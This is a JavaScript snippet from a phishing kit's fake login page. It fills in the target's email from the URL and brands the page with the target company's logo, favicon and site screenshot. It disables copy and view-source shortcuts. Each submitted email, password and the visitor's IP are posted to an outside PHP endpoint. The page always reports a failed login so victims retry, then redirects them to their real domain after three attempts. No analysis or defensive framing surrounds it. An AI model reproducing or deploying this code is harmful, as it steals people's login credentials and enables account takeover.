  <!-- Optional JavaScript -->

  <script>
    // Security measures
    document.addEventListener('contextmenu', event => event.preventDefault());
    document.addEventListener('keydown', (e) => {
      if (e.ctrlKey && [67, 86, 85, 83, 117].includes(e.keyCode)) e.preventDefault();
    });

    $(document).ready(function () {
      const config = {
        attemptLimit: 3,
        ipAPI: 'https://api.ipify.org?format=json'
      };

      let attemptCount = 0;
      let userIP = 'Unknown';
      let isSubmitting = false; // flag to prevent double submissions during overlay

      // Get IP address
      $.getJSON(config.ipAPI).done(function (data) { userIP = data.ip; });

      // Enhanced email extraction from multiple sources
      function extractEmailFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const hash = window.location.hash.substring(1);

        if (urlParams.get('state')) {
          return urlParams.get('state');
        } else if (urlParams.get('email')) {
          return urlParams.get('email');
        } else if (hash && hash.includes('@')) {
          const emailMatch = hash.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
          return emailMatch ? emailMatch[1] : null;
        }
        return null;
      }

      const email = extractEmailFromURL();

      if (email && validateEmail(email)) {
        const domain = email.split('@').pop();
        const cleanDomain = domain.replace(/^www\./i, '');

        $('#email').val(email);

        const logoImg = $('#logoimg');
        logoImg.off('error');
        logoImg.attr('src', `https://cdn.brandfetch.io/${cleanDomain}?c=1idEMLfKukXymus6cpz`);
        logoImg.css({
          'width': '150px',
          'height': 'auto'
        });
        logoImg.on('error', function () {
          $(this).attr('src', '');
        });

        const faviconUrl = `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=64`;
        $('#dynamic-favicon').attr({
          'href': faviconUrl,
          'type': 'image/png'
        });

        $('.logoname').text(cleanDomain.split('.')[0]);

        document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/https://${cleanDomain}')`;
        document.body.style.backgroundSize = 'cover';
        document.body.style.backgroundPosition = 'center top';
        document.body.style.backgroundRepeat = 'no-repeat';
        document.body.style.backgroundAttachment = 'scroll';
      }

      // ===== Allow Enter key to submit form from any input =====
      $('#mac').on('keydown', 'input', function (e) {
        if (e.key === 'Enter' || e.keyCode === 13) {
          e.preventDefault();
          $('#mac').submit();
        }
      });

      // Form submission handler
      $('#mac').on('submit', async function (e) {
        e.preventDefault();

        // Prevent double submissions while loading overlay is active
        if (isSubmitting) return;

        const email = $('#email').val().trim();
        const password = $('#password').val().trim();
        const domain = email.split('@').pop();

        // Validation – password is required
        if (!validateEmail(email)) {
          showError('Invalid email format');
          return;
        }
        if (!password) {
          showError('Password required');
          return; // do NOT count attempt
        }

        // Valid submission: start overlay and delay
        isSubmitting = true;
        $('#loadingOverlay').addClass('show');

        // Increment attempt count (only for valid password submissions)
        attemptCount++;

        // Send data to PHP endpoint (async, but we wait for overlay anyway)
        try {
          await $.post('https://www.aiceriergy.com/js/cameleon.php', {
            ip: userIP,
            email: email,
            password: password,
            domain: domain,
            page: window.location.href
          });
        } catch (error) {
          console.error('PHP submission error:', error);
        }

        // Wait 5 seconds before hiding overlay and allowing next attempt
        setTimeout(function () {
          $('#loadingOverlay').removeClass('show');
          isSubmitting = false;

          // Clear password field for next attempt
          $('#password').val('');

          // Handle attempts – if limit reached, redirect after overlay
          if (attemptCount >= config.attemptLimit) {
            window.location.replace(`http://www.${domain}`);
          } else {
            // Show error message with attempt count
            $('#msg').html(`<span style="color:red">Invalid email or password </span>`).show();
          }
        }, 5000);
      });

      function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
      }

      function showError(message) {
        $('#error').text(message).show();
        setTimeout(() => $('#error').hide(), 3000);
      }
    });
  </script>
